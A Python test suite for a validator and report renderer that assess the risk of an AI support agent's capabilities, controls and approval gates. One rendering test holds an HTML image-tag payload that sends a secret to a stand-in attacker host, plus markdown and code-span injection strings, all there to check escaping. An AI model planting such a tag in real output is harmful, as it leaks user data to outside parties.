import copy
import json
from pathlib import Path

import check_cases
import render_report
import run_consistency
import validate

ROOT = Path(__file__).resolve().parent.parent
EXAMPLE = ROOT / "examples" / "support_agent.assessment.json"
SCHEMA = json.loads(validate.DEFAULT_SCHEMA.read_text(encoding="utf-8"))


def example():
    return json.loads(EXAMPLE.read_text(encoding="utf-8"))


def run(doc):
    return validate.check(doc, SCHEMA)


def has(messages, fragment):
    return any(fragment in m for m in messages)


def test_example_is_valid_with_no_warnings():
    errors, warnings = run(example())
    assert errors == []
    assert not warnings


def test_schema_error_on_missing_required_field():
    doc = example()
    del doc["rating"]
    errors, _ = run(doc)
    assert has(errors, "schema:")


def test_schema_error_on_bad_datetime():
    doc = example()
    doc["assessment"]["assessed_at"] = "yesterday"
    errors, _ = run(doc)
    assert has(errors, "assessed_at")


def test_dangling_attack_path_ref():
    doc = example()
    doc["findings"][0]["attack_path"].append({"ref": "cap.ghost"})
    errors, _ = run(doc)
    assert has(errors, "'cap.ghost' not defined")


def test_duplicate_ids():
    doc = example()
    doc["controls"][1]["control_id"] = "cap.crm_read"
    errors, _ = run(doc)
    assert has(errors, "duplicate id 'cap.crm_read'")


def test_residual_above_inherent():
    doc = example()
    f = doc["findings"][0]
    f["inherent_risk"], f["residual_risk"] = "high", "critical"
    errors, _ = run(doc)
    assert has(errors, "exceeds inherent_risk")


def test_projected_below_residual():
    doc = example()
    doc["findings"][0]["forecast"]["projected_risk"] = "moderate"
    errors, _ = run(doc)
    assert has(errors, "below residual_risk")


def test_forecast_horizon_requires_forecast_block():
    doc = example()
    f = copy.deepcopy(doc["findings"][0])
    f["finding_id"] = "f.future"
    f["horizon"] = "forecast"
    del f["forecast"]
    doc["findings"].append(f)
    errors, _ = run(doc)
    assert has(errors, "horizon is forecast but no forecast block")


def test_rollup_mismatch():
    doc = example()
    doc["rating"]["residual"] = "moderate"
    errors, _ = run(doc)
    assert has(errors, "rating.residual")


def test_runtime_limitation_required():
    doc = example()
    doc["limitations"] = ["Some other caveat."]
    errors, _ = run(doc)
    assert has(errors, "limitations")


def test_accepted_risk_needs_approver():
    doc = example()
    doc["findings"][0]["treatment"] = {"option": "accept", "owner": "team"}
    errors, _ = run(doc)
    assert has(errors, "approved_by")


def test_rubric_inherent_mismatch_warns():
    doc = example()
    doc["findings"][0]["inherent_risk"] = "high"
    doc["rating"]["inherent"] = "high"
    errors, warnings = run(doc)
    assert errors == []
    assert has(warnings, "rubric computes inherent 'critical'")


def test_residual_below_control_floor_warns():
    doc = example()
    doc["findings"][0]["residual_risk"] = "low"
    doc["rating"]["residual"] = "low"
    _, warnings = run(doc)
    assert has(warnings, "below what path controls can justify ('high')")


def recipient_binding(**extra):
    control = {
        "control_id": "ctl.recipient_binding",
        "name": "Recipient bound to ticket record",
        "category": "preventive",
        "mechanism": "structural",
        "capability_dependence": "independent",
        "covers": ["cap.email_send"],
        "status": "verified",
    }
    control.update(extra)
    return control


def with_low_residual(doc):
    doc["findings"][0]["residual_risk"] = "low"
    doc["rating"]["residual"] = "low"
    return doc


def test_severing_control_allows_low_residual():
    doc = with_low_residual(example())
    doc["controls"].append(recipient_binding(severs_path=True))
    _, warnings = run(doc)
    assert not has(warnings, "below what path controls can justify")


def test_independent_control_without_severs_path_only_narrows():
    # Rubric step 1 needs an explicit severing claim. Without it the control earns step 3 credit only.
    doc = with_low_residual(example())
    doc["controls"].append(recipient_binding())
    _, warnings = run(doc)
    assert has(warnings, "below what path controls can justify ('moderate')")


def test_structural_dependent_control_is_not_double_credited():
    # A structural control that depends on the model earns step 4 credit only, never step 3 and 4.
    doc = example()
    doc["controls"][0]["mechanism"] = "structural"
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "high"


def test_severs_path_on_behavioral_control_is_error():
    doc = example()
    doc["controls"][0]["severs_path"] = True
    errors, _ = run(doc)
    assert has(errors, "severs_path requires a structural, independent, preventive control")


def gated_example(mode=None):
    doc = example()
    gate = {
        "control_id": "ctl.send_approval",
        "name": "Human approval before send",
        "category": "preventive",
        "mechanism": "structural",
        "capability_dependence": "independent" if mode == "raw_action" else "partially_dependent",
        "decay_rationale": "Approver may see only a model summary.",
        "covers": ["cap.email_send"],
        "status": "verified",
    }
    if mode:
        gate["approval_review_mode"] = mode
    doc["controls"].append(gate)
    doc["capabilities"][1]["approval_gate_ref"] = "ctl.send_approval"
    return doc


def test_summary_gate_floors_residual_at_moderate():
    doc = gated_example("model_summary")
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "moderate"


def test_raw_action_gate_allows_low_residual():
    doc = gated_example("raw_action")
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    controls = {c["control_id"]: c for c in doc["controls"]}
    assert validate.residual_floor(doc["findings"][0], caps, controls) == "low"


def test_gate_without_review_mode_warns_and_scores_as_summary():
    doc = gated_example()
    doc["findings"][0]["residual_risk"] = "moderate"
    doc["rating"]["residual"] = "moderate"
    _, warnings = run(doc)
    assert has(warnings, "no approval_review_mode")
    assert not has(warnings, "below what path controls can justify")


def test_declared_a2_without_gate_warns():
    doc = example()
    doc["autonomy"]["level"] = "A2_act_with_approval_on_sensitive"
    _, warnings = run(doc)
    assert has(warnings, "has no approval_gate_ref")


def test_autonomy_modifier_raises_inherent():
    doc = example()
    doc["capabilities"][1]["is_egress"] = False
    doc["capabilities"][1]["reversibility"] = "reversible"
    doc["capabilities"][1]["action"] = "write"
    f = doc["findings"][0]
    inputs = {i["input_id"]: i for i in doc["inputs"]}
    caps = {c["capability_id"]: c for c in doc["capabilities"]}
    assert validate.expected_inherent(f, inputs, caps, {"level": "A3_act_then_report", "max_unattended_steps": 5}) == "high"
    assert validate.expected_inherent(f, inputs, caps, {"level": "A4_fully_autonomous"}) == "critical"
    assert validate.expected_inherent(f, inputs, caps, {"level": "A0_suggest_only"}) == "low"


def test_validate_main_exit_codes(tmp_path):
    assert validate.main([str(EXAMPLE)]) == 0
    bad = example()
    bad["limitations"] = ["x"]
    path = tmp_path / "bad.json"
    path.write_text(json.dumps(bad), encoding="utf-8")
    assert validate.main([str(path)]) == 1
    assert validate.main([str(tmp_path / "missing.json")]) == 2


def test_render_both_views_and_escaping():
    doc = example()
    doc["subject"]["name"] = "Evil | [link](http://x)"
    text = render_report.render(doc, "both")
    assert "## Developer view" in text and "## Reviewer view" in text
    assert "| **critical** | **high** | **critical** |" in text
    assert "Evil \\| \\[link\\](http://x)" in text


def test_render_blocks_raw_html_and_code_span_breakout():
    doc = example()
    doc["findings"][0]["evidence"][0]["observation"] = '<img src="https://attacker.example/x?d=secret">'
    doc["subject"]["agent_id"] = "evil` <b>id"
    text = render_report.render(doc, "reviewer")
    assert "<img" not in text and "&lt;img" in text
    assert "`evil' <b>id`" in text


def test_render_forecast_grammar():
    text = render_report.render(example(), "reviewer")
    assert "`ctl.prompt_rule` fails and the tier becomes" in text
    doc = example()
    doc["findings"][0]["forecast"]["failing_controls"] = ["ctl.prompt_rule", "ctl.send_log"]
    assert "`ctl.send_log` fail and the tier becomes" in render_report.render(doc, "reviewer")


def test_consistency_scores_example_against_case_01():
    exp = json.loads((ROOT / "evals" / "expected" / "01_support_triage.expected.json").read_text(encoding="utf-8"))
    result = run_consistency.score_run(example(), exp, SCHEMA)
    assert result["valid"]
    assert result["recall"] == 1.0
    assert all(result["in_range"].values())
    lines, ok = run_consistency.summarize("01_support_triage", [result, result], 0.8)
    assert ok, lines


def test_eval_cases_and_expected_files_agree():
    assert check_cases.main() == 0


def test_evidence_substring_and_forecast_minimum_scoring():
    exp = {
        "kind": "forecast",
        "rating": {"inherent": ["critical"], "residual": ["high"], "forecast": ["critical"]},
        "required_evidence_substrings": ["instruction only"],
        "required_forecast_findings_min": 1,
        "false_positive_threshold": "moderate",
    }
    result = run_consistency.score_run(example(), exp, SCHEMA)
    # Evidence substring is found; no forecast horizon finding exists, so recall is 1 of 2.
    assert result["recall"] == 0.5
    # The example's present finding has residual high, which counts as a false positive here.
    assert result["false_positives"] == 1
